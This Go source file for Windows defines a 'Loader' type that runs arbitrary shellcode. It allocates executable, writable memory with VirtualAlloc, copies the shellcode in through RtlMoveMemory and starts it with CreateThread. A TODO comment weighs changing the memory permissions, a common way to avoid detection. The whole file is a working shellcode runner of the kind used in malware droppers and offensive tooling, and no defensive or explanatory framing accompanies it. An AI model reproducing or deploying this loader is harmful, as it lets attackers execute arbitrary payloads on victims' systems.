package loader

import (
	"errors"
	"unsafe"

	"golang.org/x/sys/windows"
)

type Loader struct {
	shellcode   []byte
	ntdll       *windows.LazyDLL
	kernel32dll *windows.LazyDLL
}

func NewLoader(shellcode []byte) *Loader {
	return &Loader{
		shellcode:   shellcode,
		ntdll:       windows.NewLazyDLL("ntdll.dll"),
		kernel32dll: windows.NewLazyDLL("kernel32.dll"),
	}
}

func (l *Loader) Execute() error {
	// Allocate memory - https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
	addrPtr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(l.shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE) // TODO: Maybe changed to PAGE_READ_WRITE? and change with VirtualProtect?
	if err != nil {
		return err
	}

	if addrPtr == 0 {
		return errors.New("VirtualAlloc failed")
	}

	// Copy shellcode - https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
	rtlMoveMemory := l.ntdll.NewProc("RtlMoveMemory")
	_, _, err = rtlMoveMemory.Call(addrPtr, (uintptr)(unsafe.Pointer(&l.shellcode[0])), uintptr(len(l.shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return err
	}

	// Create thread - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
	createThread := l.kernel32dll.NewProc("CreateThread")
	thread, _, err := createThread.Call(0, 0, addrPtr, uintptr(0), 0, 0)
	if err != nil && err.Error() != "The operation completed successfully." {
		return err
	}

	// Wait for the thread - https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
	_, err = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
	if err != nil {
		return err
	}

	return nil
}
